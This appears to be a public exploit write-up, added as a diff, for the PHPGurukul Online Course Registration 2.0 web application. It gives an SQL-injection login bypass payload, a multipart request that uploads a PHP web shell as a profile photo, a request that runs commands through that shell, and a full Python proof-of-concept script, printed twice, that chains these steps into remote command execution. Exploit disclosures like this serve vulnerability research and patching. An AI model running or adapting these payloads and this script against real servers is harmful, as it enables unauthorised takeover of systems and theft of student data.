@@ -1,0 +1,145 @@
+# Exploit Title: Online Course Registration 2.0 - Remote Code Execution
+# Exploit Author: Metin Yunus Kandemir
+# Vendor Homepage: https://phpgurukul.com/
+# Software Link: https://phpgurukul.com/online-course-registration-free-download/
+# Version: v2.0
+# Category: Webapps
+# Tested on: Xampp for Windows
+
+# Description:
+Attacker can bypass login page and access to student change password dashboard.
+
+PoC Request (Authentication Bypass):
+
+POST /onlinecourse/index.php HTTP/1.1
+Host: target
+
+regno=joke' or '1'='1'#&password=joke' or '1'='1'#&submit=
+
+
+There isn't any file extension control in student panel "My Profile" section.
+An unauthorized user can upload php file as profile image.
+
+First PoC Request (RCE):
+
+POST /onlinecourse/my-profile.php HTTP/1.1
+Host: target
+
+-----------------------------16046344889164047791563222514
+Content-Disposition: form-data; name="photo"; filename="simple.php"
+Content-Type: application/x-php
+
+<?php $cmd=$_GET["cmd"]; echo `$cmd`; ?>
+
+
+Second PoC Request (RCE):
+
+GET /onlinecourse/studentphoto/simple.php?cmd=ipconfig HTTP/1.1
+Host: target
+
+
+Below basic python script will bypass authentication and execute command on target server.
+
+
+
+
+
+import requests
+import sys                        
+
+if (len(sys.argv) !=3) or sys.argv[1] == "-h":
+print "[*] Usage: PoC.py rhost/rpath "
+print "[*] e.g.: PoC.py 127.0.0.1/onlinecourse "
+exit(0)
+
+rhost = sys.argv[1]
+command = sys.argv[2]
+
+
+
+url = "http://"+rhost+"/index.php"
+data = {"regno": "joke' or '1'='1'#", "password": "joke' or '1'='1'#", "submit": ""}
+
+with requests.Session() as session:
+#bypass authentication
+lg = login = session.post(url, data=data, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+
+#check authentication bypass
+check = session.get("http://"+rhost+"/my-profile.php", allow_redirects=False)
+if check.status_code == 200:
+print "[+] Authentication bypass was successfull"
+else:
+print "[-] Authentication bypass was unsuccessful"
+sys.exit()
+
+#upload simple php file
+
+files = {'photo':('command.php', '<?php system($_GET["cmd"]); ?>')}
+fdata = {"studentname": "Test", "studentregno": "10806157", "Pincode": "715989", "cgpa": "0.00", "photo": "command.php", "submit": ""}
+furl = "http://"+rhost+"/my-profile.php"
+session.post(url=furl, files= files, data=fdata)
+
+#execution
+final=session.get("http://"+rhost+"/studentphoto/command.php?cmd="+command)
+
+#check execution
+if final.status_code == 200:
+print "[+] Command execution completed successfully."
+print "\tPut on a happy face!\n"
+else:
+print "[-] Command execution was unsuccessful."
+sys.exit()
+
+print final.text
+
+online-course-registration-rce.png
+
+poc.py
+
+import requests
+import sys                         
+
+if (len(sys.argv) !=3) or sys.argv[1] == "-h":
+	print "[*] Usage: PoC.py rhost/rpath "
+	print "[*] e.g.: PoC.py 127.0.0.1/onlinecourse "
+	exit(0) 
+
+rhost = sys.argv[1]
+command = sys.argv[2]
+
+
+
+url = "http://"+rhost+"/index.php"
+data = {"regno": "joke' or '1'='1'#", "password": "joke' or '1'='1'#", "submit": ""}
+
+with requests.Session() as session:
+	#bypass authentication
+	lg = login = session.post(url, data=data, headers = {"Content-Type": "application/x-www-form-urlencoded"})
+	
+	#check authentication bypass
+	check = session.get("http://"+rhost+"/my-profile.php", allow_redirects=False)
+	if check.status_code == 200:
+		print "[+] Authentication bypass was successfull"
+	else:
+		print "[-] Authentication bypass was unsuccessful"
+		sys.exit()	 
+
+	#upload simple php file
+
+	files = {'photo':('command.php', '<?php system($_GET["cmd"]); ?>')}
+	fdata = {"studentname": "Test", "studentregno": "10806157", "Pincode": "715989", "cgpa": "0.00", "photo": "command.php", "submit": ""}
+	furl = "http://"+rhost+"/my-profile.php"
+	session.post(url=furl, files= files, data=fdata)
+	
+	#execution
+	final=session.get("http://"+rhost+"/studentphoto/command.php?cmd="+command)
+
+	#check execution
+	if final.status_code == 200:
+		print "[+] Command execution completed successfully.\n"
+		print "\tPut on a happy face!\n"
+	else:
+		print "[-] Command execution was unsuccessful."
+		sys.exit()
+
+	print final.text
